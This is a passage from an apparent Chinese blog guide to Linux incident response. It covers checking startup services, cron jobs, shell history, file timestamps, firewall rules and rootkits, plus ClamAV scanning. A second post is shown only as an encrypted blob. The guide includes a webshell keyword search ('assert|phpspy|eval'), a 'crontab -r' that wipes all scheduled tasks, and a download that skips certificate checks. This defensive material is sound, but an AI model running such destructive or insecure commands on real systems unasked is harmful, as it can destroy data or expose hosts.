</span><br></pre></td></tr></table></figure><table><thead><tr><th>数字</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>单用户模式</td></tr><tr><td>2</td><td>无网络连接的多用户命令行模式</td></tr><tr><td>3</td><td>有网络连接的多用户命令行模式</td></tr><tr><td>4</td><td>表示不可用</td></tr><tr><td>5</td><td>带图形界面的多用户模式</td></tr><tr><td>6</td><td>表示重新启动</td></tr></tbody></table><blockquote><p>查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。</p></blockquote><p><code>/etc/init.d</code>目录</p><blockquote><p>init.d目录中的脚本都是<strong>以服务的形式</strong>启动的,系统在执行init.d目录中的服务脚本时，会分别单独为每个服务脚本启动一个非登录非交互式shell来始终在后台运行服务脚本一直到用户退出登录，关闭系统.</p></blockquote><p><code>/etc/rc.d/rc.local</code>目录</p><blockquote><p>系统初始化级别脚本运行之后再执行的，因此可以安全地在里面添加你想在系统启动之后执行的脚本</p></blockquote><p>详见<a href="https://cloud.tencent.com/developer/article/1533529">Linux之init.d、rc.d文件夹说明</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --type=service |grep enabled</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service --status-all</span><br></pre></td></tr></table></figure><h1 id="非易丢失数据"><a href="#非易丢失数据" class="headerlink" title="非易丢失数据"></a>非易丢失数据</h1><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211116191459348.png" alt="image-20211116191459348"></p><blockquote><p>左边是服务名称，右边是状态，enabled是开机启动，disabled是开机不启动  供应商预设(VENDOR PRESET)</p></blockquote><p>开启启动配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><blockquote><p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/rc.local</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /etc/init.d</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/init.d/rc.local</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/rc.d/rc[0~6]</span><br></pre></td></tr></table></figure><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><p><code>crontab -l</code> 列出某个用户cron服务的详细内容</p><blockquote><p>默认编写的crontab文件会保存在 (<code>/var/spool/cron/用户名</code> 例如: <code>/var/spool/cron/root</code>)</p></blockquote><p><code>crontab -u root -l</code></p><p><code>crontab -r</code> 删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p><code>crontab -e</code> 使用编辑器编辑当前的crontab文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/cron.daily/*  查看目录下所有文件</span><br></pre></td></tr></table></figure><h3 id="etc目录下的任务计划文件"><a href="#etc目录下的任务计划文件" class="headerlink" title="etc目录下的任务计划文件"></a>etc目录下的任务计划文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron*</span><br><span class="line">常见文件夹</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/var/spool/cron/*</span><br></pre></td></tr></table></figure><h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">cat /用户家目录/.bash_history</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><p>保存1万条命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br></pre></td></tr></table></figure><h2 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h2><h3 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h3><p>查看敏感目录（临时目录<code> /tmp</code>，命令目录<code>/usr/bin/ /usr/sbin</code>，网站目录等）</p><p><code>~/.ssh</code> <code>/etc/ssh</code> 经常作为后门配置路径</p><h3 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h3><p><code>find</code>命令：指定目录下查找文件</p><p>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b/d/c/p/l/f</span><br></pre></td></tr></table></figure><p>块设备/目录/字符设备/管道/符号链接/普通文件</p><p><code>-n</code>:n天之内</p><p><code>+n</code>:n天以前</p><p><code>-mtime</code>:更改时间</p><p><code>-atime</code>:访问时间</p><p><code>-ctime</code>:创建时间</p><p>查找一天内新增的shell文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -ctime 0 -name &quot;*.sh&quot;</span><br></pre></td></tr></table></figure><p><code>stat</code>查看文件时间点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">stat</span> 1.sh</span></span><br><span class="line">  File: ‘1.sh’</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: fd00h/64768d    Inode: 51317256    Links: 1</span><br><span class="line">Access: (0664/-rw-rw-r--)  Uid: ( 1000/ dropann)   Gid: ( 1000/ dropann)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line">Modify: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line">Change: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line"> Birth: -</span><br><span class="line"></span><br><span class="line">Device: fd00h/64768d：文件所在设备号，分别以十六进制和十进制显示</span><br><span class="line">Inode: 51317256：文件节点号</span><br><span class="line">Links: 1：硬链接数</span><br><span class="line">Access: (0664/-rw-rw-r--)：访问权限</span><br><span class="line">Uid：所有者ID与名称</span><br><span class="line">Gid：所有者用户组ID与名称</span><br><span class="line">Access：最后访问时间</span><br><span class="line">Modify：最后修改时间</span><br><span class="line">Change：最后状态改变时间</span><br><span class="line">Birth -：无法获知文件创建时间。注意：Linux下的文件未存储文件创建时间</span><br></pre></td></tr></table></figure><table><thead><tr><th>时间</th><th>名称</th><th>中文</th><th>描述</th></tr></thead><tbody><tr><td>atime</td><td>Access</td><td>最近访问时间</td><td>最后一次访问文件（读取或执行）的时间</td></tr><tr><td>mtime</td><td>Modify</td><td>最近修改时间</td><td>最后一次修改文件（内容）或者目录（内容）的时间</td></tr><tr><td>ctime</td><td>Change</td><td>最近变化时间</td><td>最后一次改变文件（属性或权限）或者目录（属性或权限）的时间</td></tr></tbody></table><blockquote><ol><li>当读取文件时，atime改变，mtime和ctime不变</li><li>当修改文件时，atime，mtime，ctime都会改变</li><li>修改文件属性时，ctime改变，atime，mtime不变</li><li>more，less，cat，nl，tail，tac等命令会更改atime</li><li>ls，stat命令不会修改atime</li><li>通过chmod，chown修改文件属性，会更新ctime。touch则会更改atime，ctime，mtime</li></ol></blockquote><p>查看特定文件夹一天前访问的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /opt -iname &quot;*&quot; -atime 1 -type f</span><br></pre></td></tr></table></figure><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>权限特殊如777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /tmp -perm 777</span><br></pre></td></tr></table></figure><p>文件类型+文件中关键字（查webshell）</p><p><code>xargs egrep</code>+关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /var/www/ -name &quot;*.php&quot; | xargs egrep &#x27;assert|phpspy|eval&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>系统命令是否被替换：查看命令目录的相关系统命令的修改时间，文件大小从而判断是否被修改。</p><p><code>ls -alt /bin</code>  修改时间</p><p><code>ls -alh /bin</code>  文件大小</p><h2 id="防火墙规则"><a href="#防火墙规则" class="headerlink" title="防火墙规则"></a>防火墙规则</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p><a href="https://dropann.github.io/p/c8bc8d54.html">Linux日志</a></p><h2 id="Rookit数据排查"><a href="#Rookit数据排查" class="headerlink" title="Rookit数据排查"></a>Rookit数据排查</h2><p>命令：<code>rootkithunter</code> <code>chkrootkit</code></p><h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p><a href="http://www.chkrootkit.org/">官网地址</a></p><p>下载源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br></pre></td></tr></table></figure><p>安装编译工具包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ make glibc-static</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense </span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure><blockquote><p>出现INFECTED就说明系统可能有问题了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211117111158425.png" alt="image-20211117111158425"></p><blockquote><p>这里是个误报，<code>/tmp</code>目录下存在可执行文件</p></blockquote><p><a href="https://www.cnblogs.com/binyue/p/4707948.html">Linux下如何查找可执行文件</a></p><h3 id="rootkithunter"><a href="#rootkithunter" class="headerlink" title="rootkithunter"></a>rootkithunter</h3><p>RKHunter是专业检测系统是否感染rootkit的工具，通过执行一系列脚本来确定服务器是否感染rootkit。RKHunter可以做到：</p><ol><li>MD5校验测试, 检测任何文件是否改动.</li><li>检测rootkits使用的二进制和系统工具文件.</li><li>检测特洛伊木马程序的特征码.</li><li>检测大多常用程序的文件异常属性.</li><li>执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.</li><li>扫描任何混杂模式下的接口和后门程序常用的端口.</li><li>检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.</li><li>对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.</li></ol><p><a href="http://rkhunter.sourceforge.net/">官网地址</a></p><p>下载源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://onboardcloud.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz --no-check-certificate</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf rkhunter-1.4.6.tar.gz</span><br><span class="line">cd rkhunter-1.4.6</span><br><span class="line">./installer.sh --install</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure><p>程序自动执行不用每个部分Enter继续</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --check --sk | grep Warning</span><br></pre></td></tr></table></figure><p>在线更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --update</span><br></pre></td></tr></table></figure><h2 id="打包数据"><a href="#打包数据" class="headerlink" title="打包数据"></a>打包数据</h2><h3 id="打包网站数据"><a href="#打包网站数据" class="headerlink" title="打包网站数据"></a>打包网站数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf test.tar `find . -type f -name &quot;*.jsp*&quot;`</span><br></pre></td></tr></table></figure><blockquote><p>打包文件名中包含jsp的文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf test1.tar.gz /aaa/</span><br></pre></td></tr></table></figure><h3 id="打包日志数"><a href="#打包日志数" class="headerlink" title="打包日志数"></a>打包日志数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf var_log.tar.gz /var/log</span><br><span class="line">last &gt; last.log</span><br><span class="line">netstat -an &gt; netstat.log</span><br></pre></td></tr></table></figure><h3 id="打包数据库数据"><a href="#打包数据库数据" class="headerlink" title="打包数据库数据"></a>打包数据库数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">停止</span><br><span class="line">systemctl stop mysqld</span><br><span class="line">备份</span><br><span class="line">mysqldump -u root -p 数据库密码 数据库名称 &gt; 具体备份路径</span><br><span class="line">mysqldump -u root -p mysite &gt; /var/databakup/mysite.sql</span><br><span class="line">压缩</span><br><span class="line">tar -czvf mydql_data.tar.gz /var/lib/mysql/</span><br></pre></td></tr></table></figure><h1 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h1><h2 id="Clamav"><a href="#Clamav" class="headerlink" title="Clamav"></a>Clamav</h2><p><a href="http://www.clamav.net/download.html">官方地址下载</a></p><p><a href="https://docs.clamav.net/">操作手册</a></p><p><a href="http://www.vue5.com/centos/23049.html">在CentOS 7上安装ClamAV</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描方法</span></span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描并杀毒</span></span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line"><span class="meta">#</span><span class="bash">查看日志发现</span></span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure><h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><p><a href="http://www.shellpub.com/">河马webshell查杀</a></p><h1 id="安全检测脚本"><a href="#安全检测脚本" class="headerlink" title="安全检测脚本"></a>安全检测脚本</h1><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker初始化</title>
      <link href="/p/1ddb4f36.html"/>
      <url>/p/1ddb4f36.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5e740976786afe5a5e22cd7416b8bd189750f62b4f4bb2abefbd380ea2db2673">c157c9744e0298d00173c08a9dbffe0ec94f198c43dd2b95a3c3b526c19ab930fc2f626e403ff6be879321602af979fcefe222908fade7e040cdb328580fffef39bc951b3dfa22c575df45c74428be1a3b02f350a45f5b6fa67ba5446f594ac4bcc4ee39e2513dc65a3a4cdac066255cf3707b773f51d2885df2f2a4c75aff7dcde8f84552e7ab0bc1ab73c77d91cc1e250adcb5ddc3fa9dac5af68bff2444d24d92cbf3b110036fb14fbc32b81071c7f9559d7d8002be86de2f1aebd9b7cc3f413e27f64e7ac4ed7748d15ee6cd9fbce430fb3da21a03e18c4dd820a3ae7b90b56871695849fbbc12aca3f11c0765d2444efb80dea39345343a84d5dec06592dfab3f3754989070393c53d59147738a647a1e16f98d9fb9b2ea407f349db83c235f0dd95e5d82010bef69a2f39be46ec5a40a2a59e33e37bfffcdd4735a6d42967d9d558d51a22c44403faa3a615523143ed1482a8e29faa5f1aa8f7a7a56c4ab5719dee24dfd7bd16221b09e8dfe27afd9978716a8b868bdb95e7d18791374d8337915d109244409f4e5ad208eb516ac64411eca887796d5fe24b780ee49f23e90e14add9a864c068b4c1eb64aea880fc963fc9f031088a55569e9fd5b9f73ba0c59301b47b77f25fad24bb78b53855e4671f089e3c1c2f0d57c41f2823f721ceda1b0055da5127d06d6c3b8bc64b30859a449ec2b0b9154fe7d68e3985e6837bc148fb63c05d5427785e8775588f2f560756e9c870202e8793d35d976356f7014c9ad4c394ddd255240cf0a6df1f594dc25a765f386c7278d9c178b0219005552e0c4a4124dc681cba775a4e3a63ea17769527bfe4f704a506f66b32fa3e8127e97db0c4b10f98648a587b913949052cecc9f8c494e2553754078a52c53c9e8c74b4baa1675f5ee29a1a5a2ad9d62bc969ad2cea79f2e98bb43427b0359f888359442ae361b6239a7cc64ac6deeb9e27db0d7341d244130af58af11ea2de3d81c2895fa5183c7b43102921f9ce0745627900664b84811d71253aee92c274fa88c1beb02f6681f7750390c2e91270454b8c8baa0b5a75ddf3116140ee2c58cb5721e952835ab20e5f386d1b87f56094223a320946a9fcf5893d671c6e7d044af4de6a44b273738857c145ee10732607d5ab74d86c06ec4f1164b862ab63b6647feed88a61be750b76aa28400ebc2a94097da7d589926fa1a3517536eee575e829187e923b90999ef0590769b33b15c62f644c5f79cba2aee025bcf24d7b412c11bf99ba8a180b02c163b8e8e33a538067d6668b87aa9838b5d3a13bfc50f0d37759a1f5bfc630f7b575de0681707dcfd5a2ed47e96bab796f3fc42e85ba9992b25c36913063896c86cd5fa84d0ad64bde6fbe07ef16171721ce69f0645ec7c1051fa0c86d8e30f9c39af2ccf74ad17a612563b3691e05001062f3691b586a5f188b7122271062b9000ceed02744949895b3b4f6656a6e93e0ade0d20a9798256810a6da34c466a2e958d0621898c80869360c257087c5a8f906af4ab4fbc91e7d528dae53ecd9f305ea8c8dcbb12e3de2ae21bcce7fe74a86ab82f8cef2bcf92900a0ff394041282b137e804129a91a2aaf41040b144d7c023a56af850d91a89e4288cee77f3dda53443f3336667a01adfb844be121194c0c3a6177332d260a60a7f62aad96339c3b684cdb1f4314d4f5227e1d3670da088d8ffae5a42427a7541b815042500c6708cd7101b5e208868b791b0975aa5087176e558a6446c018e88dd1585caaa7d51f595c0400ec769d342e6af69fc05439e54b1624e5236d7fc66ab49781dfe423c0ae3c434f6c0a3df9e2eb4bceb6de85ed4429cd5ca09a9adf67bd4c1e0fc91b90c6f61405660f15f878a2bb1b5b8889ac5c4e4ce2fd46568223f3ea1c7afde5ca3e55a081abc89b19836f0db3ab6b0f0c9fd805b6940577fce7ccafb20fbffa06d3303944fb01bd39c497a36194afaf2bd3309d842b4256b1b20145b5c78d3081afd743f43ee9119e68b2094a20fb537a32ef935c937e6741141c976135a1f65059f7ef454168000c183897ceae5c1e553e160cf2a6d7aee09ae1b8c5f2ca6d46310b64c3bc9ea6b5a7607120282fadfcc0e5abd4eb1e0f2f5b9a6424e51901281caa0fd6cba35e27d10509e7234e6893426df8e781d3e469e4285dc1482df46d649291be92a32bd93c7db255cade0e294c4a994df665d3be156ff5c4a29fc8cc0607acd374c096f91a0ed55893d46aa2fd5f02e9d17b657bc42238b6dd22c97445754f390ca404f07273272aeb2628b7908f39efb7a99a87ddb350dc1f4645da5f6372af7edb4a749d1fb21ad32c5eade80a3c5ddd13d2672cd97f47c562a5a372beddd883a370392104637391d25f57960814c6d84ea9de5927d25542144b9fa9f21adfb2ab7467eeab9db1afe8742ead06d839691f9d998f273d5994e3044540f65ca9699d68424e04807ad3e4bcffdc1024b76f8f82b512d506f426b2683b703dc37b42002901ef37b965caa2ce2175973e8752b787758f6a51c6b98b738d540d8e8c6c90ae25d60cfa38d53e22d3554af25fe6b139dd0ccd75ae80dc99fd4519cbe089c16261191735f366f14e7d6c8a63154e5c78e37ce57d7ad79bfa3855af6538b9b4b951ec3fe63089edc7606f66d9f221d31497253b5bf792d0efac04f58f8dfa22152ae5d9c834342cf9a3700cf9160d6ba6bd94ba5e676d4b21f6deb0ddc167178d0f4c81e75d121b9841f5a164c340e052391e0e0a05ef5c778babff1e52cb3af2f5f12e32f22c6316b15aea3a7a2bc91981fd896ffdfa4a9421cbf4707b7e5a4a7fc17683a40f0745d860e68527688412dca62351b50354ee12bca0704a4ed6b0a28b43a64ebb5f69a1c1082a16efd8624e88c98d32e9b764ff6369ab36e1441acb99f023859f0f760cd21b6fcfa4dbd35a9736e3bcd7c3a1442ac29a256a009502c9e4b1d3a3acebcbae0ee1f43eb36f908bfcbc23a4f85da4ed8b43a84ca16a68099e0247919cd03fd0fb8f6e65071bf093866098c1d936f649720c1b2018938a519e05be76b2011e2416c709bbd04bf9d098dcf2469ef017e5f86913b65a75e9f7e731020b9c175fd28af26a1c75befb067414522e170591382aff968e428623613ae0577d15557e43ce00236d6dc8940612f3e89bbc07d113d892d4aee5d5555fb3f324670be9017b663aed7c7f1818e6876c2ec65094c93e6474344a4896d7075ef3fd09d85d181f07397620ae4a24d6ce2ff70faca1e179963f42accdd6a4ab8b3180c53896526d1e8f5b683e0b2364d885de965aa6023312c16e7063970b712a103aa041083c19caa9829de58b41297e6731b8de96322bb86496f581a3774d9e8682496c097db025b009b99681111a948b44eb3646f6aa340a08e9329c86fec75066b6a051c0023a19e7b060e74d2837a7e8cf1fa284ff10f117e7ca1bf5e5efff41f0bb3cc321b691214b6fe2b459f7a396e12363355cf774c7ca9565c95abf4e5b26696ee60e7a916d6c58010cdf43661c48bce7e6f6332a992e97aab3e976264173d9f8ab947a916f77f0f8eac8f57d2fb58c460e627ff4b86d0a5d5bd612e1fba5012b583ac3e8cf5f2a4da001ece351523e0eadb30ce6cc715c7d0cc5150e3fcbf5ab62c469a10d369ce269cfad7a22c6de6d248973207384bafe546cd2ee8ce41fc41ea42312002d47f91cb65f3a182cf3b3ce1bee739f0db7343d79d6a388603337b039340ce71caa8520d365a1718ea40e129c046abea69c682c2b60fe8db64c8b56d9e2f3151c84eef59801f54d8bb2f702385989b028098c588fa96f9bc49f7914d4089976b69d01883d3b72a5b092f8f30a9d603c5fb871546be05e8c943ed0d948889ed4afbdd4e6f3af3dedf9b33389289ab6c0d6ab766b94ab9cf208f21e5e571aad2318eb0a3215173efc2d23c592cc45f45b8e613080bbad2a6c6babad6301e57fcb9affcf447678c51e623fd14035da93a4aa9254e50069209d919d830ae06cbf21cb9f1d2a005644f57d588b66ca371ed0d5b94630fe0ec28c1ea32eaa1f173fc3d6927201d64490f6823743d1a95b2a3ba08fc0722ae5d55cdebff34dea87171f46ef7f19195961cc4fe07cb546d571f3d8c9cdf0cb3b9a23d4b72a84eac9ddc1484921271ab780006e36afa1ce009eb02cdd3987398616524658e80ab26e322a9d3144a155a09a775a8a56a11bab5f51fb677d1c6f54a992177ba96a228892559c6976b4d7346b75360690c88ae6fb5c53cbc51e5e97f27b1ccc2da0b64dba2f7a4c812ec5ba8322f6be8d813c647cc3cce2aa38600747684ecc9089e510cb4eb0535c0d38fd1e0c4c942e1cab1217150ecbd4d4a25842a4e81f60e9f2c29a46c92b561955d359fdaf7cfb518abc2c3a4964daaaf9d793fe9753bc817d4f41663a201d2e41763761ebcbe407beef99428f7ba957eda6f9ac674ea84a122786c9702f8459c085c3da408caae24883e07e8353970b139b2cf42c37c1c63fce238ec125019a9f1857db27eef04b614d8c9d2774f437b10cd175c812a817e5a1824969a5638f65b087e55af84feb76b3abac02264bfc814c143a702fba1e67d4a2a03c944537ec8ed5d1629dc0a206be202dc07e25b1afa7900d0701eeec83ddc4280aa81a7cadc15eb05dee19978a2ab3eaf1f0aa6680fd8ce917c224dbacbe4aa5ae0a198b16f739df096d0b39ce19013132a8288aecb9007aaa76a1e1f68680819d9b923e57be98fcdf7f0f89ecee5403c92b265a70a6e1c8dfd9c989e937795e01104bb6697deafd57c5461add9f3a9ae65d0d3f58583a143a4938949c9bc19005016dda60542a110bec865516f2cdc1a42335b3d987e35c9318c335cdf846e2193e38166614b6575639e020c7f703681e92f2beb5f9cba68f42df3262c1c4106036148ab43e486e854f5351f499e5f3ab352d5f253c92c63c556e99e558ac011c02d1664b849134f9d6e693cdc06320a550fe7b38758726e373c13f93e6f6eceed534d5c67554c45a4eed9870603e436d5286127b687a07f61bfb2673dd5140ca96e8704dd44ade61c2dc543035e9fab283a2f75859c4d282aefdda0cbc0e3e7e31a0291892583e1f70a5891f902b6c45b204dc161c5d856010c05e5d1c151a37f7401a3b5c8650783fdadaf658fad6c92092f3d558f0d6e0d4e6fd0420af2f5b28f59ed3b651e9a015df735aa3bccebe154b31d9a7ec2d4786f620f1a7b22e3d418e779aa24ae362e133ecbcd71c0cee96daf2a071af282c76306da691e6348ef1a771761a55c341cfefde80d4c09befa38d9311fdcac7e2b5f2d2d5ddddaf42498793530450e514ea974adcd1f77a12615b507f8ce72961717cc2b7ef4aa2ac6a919b00309937fd69b23894fd909bde0502b8ba51f08388cba5710754cdd9637f6af7ef4de952f88873b39f67304cd086b4c9223c7e57af20d749f50110bb79cdb6a8eff54377e7ad10f1d52f7a0da2332dbcf23d78ae55f1430602959f8fbd62c11cecc043c8aa73ccd37cccbb35db2d716abe21bbc9d4ac85d734905c03602396c459b13b518648870382f81009771e1450760b82deebb019c438e3450cc463912ed0fe9071d9b87ba58